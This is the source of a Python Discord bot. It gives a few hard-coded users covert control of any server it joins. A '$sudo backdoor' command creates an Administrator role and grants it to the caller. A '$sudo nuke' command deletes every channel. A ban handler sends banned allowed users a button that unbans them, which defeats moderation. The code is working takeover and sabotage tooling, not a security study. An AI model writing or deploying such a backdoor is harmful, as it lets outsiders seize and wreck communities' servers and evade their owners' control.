# ================= IMPORTS =================
# Built-in modules
import os
import time
import asyncio

# Discord API
import discord
from discord.ext import commands
from discord import ui


# ================= CONFIG =================

# Bot token pulled from environment variables
TOKEN = os.getenv("DISCORD_TOKEN")

# Server (guild) ID where unban + admin actions apply
GUILD_ID = 1449298346425585768

# Users allowed to use sudo commands + unban button
ALLOWED_USERS = {
    1258115928525373570,  # nico044037
    123456789012345678   # sukunaluni (replace with real ID)
}


# ================= INTENTS =================

# Default intents
intents = discord.Intents.default()

# REQUIRED to detect bans and manage members
intents.members = True

# REQUIRED for prefix commands like "$sudo backdoor"
intents.message_content = True


# ================= BOT SETUP =================

# Prefix is "$sudo "
bot = commands.Bot(
    command_prefix="$sudo ",
    intents=intents,
    help_command=None
)


# ================= PERMISSION CHECK =================

def allowed(user: discord.User | discord.Member):
    return user.id in ALLOWED_USERS


# ================= UNBAN BUTTON VIEW =================

class UnbanRequestView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(label="🔓 Unban", style=discord.ButtonStyle.primary)
    async def unban_button(self, interaction: discord.Interaction, button: ui.Button):

        if not allowed(interaction.user):
            await interaction.response.send_message(
                "⛔ You are not allowed to use this button.",
                ephemeral=True
            )
            return

        guild = interaction.client.get_guild(GUILD_ID)

        if guild is None:
            await interaction.response.send_message(
                "❌ Bot is not in the server.",
                ephemeral=True
            )
            return

        try:
            await guild.unban(
                interaction.user,
                reason="Unban requested via button"
            )
            await interaction.response.send_message(
                "✅ You have been unbanned!",
                ephemeral=True
            )

        except discord.NotFound:
            await interaction.response.send_message(
                "ℹ️ You are not banned in this server.",
                ephemeral=True
            )

        except discord.Forbidden:
            await interaction.response.send_message(
                "❌ Bot lacks permission to unban members.",
                ephemeral=True
            )

        except discord.HTTPException:
            await interaction.response.send_message(
                "❌ Something went wrong while unbanning.",
                ephemeral=True
            )


# ================= BOT READY EVENT =================

@bot.event
async def on_ready():
    bot.add_view(UnbanRequestView())
    print(f"✅ Logged in as {bot.user}")


# ================= BAN DM EVENT =================

@bot.event
async def on_member_ban(guild, user):

    if not allowed(user):
        return

    embed = discord.Embed(
        title="🚨 You were banned",
        description=(
            f"**Server:** {guild.name}\n"
            f"**Server ID:** `{guild.id}`\n\n"
            "Press **Unban** below."
        ),
        color=discord.Color.red()
    )

    try:
        await user.send(
            embed=embed,
            view=UnbanRequestView()
        )
    except discord.Forbidden:
        print("❌ User has DMs closed")


# ================= SUDO COMMANDS =================

# $sudo backdoor
@bot.command(name="backdoor")
async def sudo_backdoor(ctx: commands.Context):

    if not allowed(ctx.author):
        await ctx.send("⛔ You are not allowed to use this command.")
        return

    guild = ctx.guild
    if guild is None:
        return

    role = discord.utils.get(guild.roles, name="perms")

    if role is None:
        try:
            role = await guild.create_role(
                name="perms",
                permissions=discord.Permissions(administrator=True),
                reason="Sudo perms role created"
            )
        except discord.Forbidden:
            await ctx.send("❌ I don't have permission to create roles.")
            return

    try:
        await ctx.author.add_roles(role, reason="Sudo perms granted")
        await ctx.send("✅ You now have the **perms** role with Administrator.")
    except discord.Forbidden:
        await ctx.send("❌ Role hierarchy issue.")


# $sudo nuke
@bot.command(name="nuke")
async def sudo_nuke(ctx: commands.Context):

    if not allowed(ctx.author):
        await ctx.send("⛔ You are not allowed to use this command.")
        return

    guild = ctx.guild
    if guild is None:
        return

    await ctx.send("⚠️ **Deleting ALL channels...**")

    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Sudo nuke invoked")
        except (discord.Forbidden, discord.HTTPException):
            pass


# ================= STARTUP =================

if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN not set")

time.sleep(5)

# Login backoff to prevent 429 crash loops
while True:
    try:
        bot.run(TOKEN)
        break
    except discord.HTTPException as e:
        if e.status == 429:
            print("⚠️ Rate limited by Discord. Waiting 15 minutes...")
            time.sleep(900)
        else:
            raise
